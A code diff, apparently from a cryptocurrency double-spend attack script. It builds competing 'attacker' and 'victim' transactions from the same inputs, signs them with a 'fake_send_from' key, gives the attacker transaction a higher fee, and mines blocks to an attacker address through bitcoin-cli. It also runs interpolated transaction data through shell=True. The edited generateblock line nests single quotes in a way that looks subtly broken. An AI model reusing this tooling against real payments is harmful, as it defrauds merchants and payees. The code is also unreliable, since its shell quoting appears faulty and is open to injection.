@@ -102,7 +102,7 @@ coin_symbol = args.symbol
 fee = to_satoshi(args.fee)
 
 def generate_block(transaction_info):
-    return subprocess.run(f"bitcoin-cli generateblock {attacker_address} \"['{transaction_info}']\" false",
+    return subprocess.run(f"bitcoin-cli generateblock {attacker_address} '['{transaction_info}']' false",
                    shell=True,
                    stdout=subprocess.PIPE).stdout
 
@@ -111,10 +111,9 @@ def submit_block(block):
                    shell=True,
                    stdout=subprocess.PIPE).stdout
 
-if testnet:
-    print("testnet mode")
 port     = 8332
 if testnet:
+    print("testnet mode")
     port     = 18332 # testnet ltc port
 
 if "ltc" == coin_symbol:
@@ -157,7 +156,7 @@ tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee + 2
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 
 tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
-tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
+tx_victim   = transaction_util.sign(tx_victim,0, fake_send_from)
 #tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
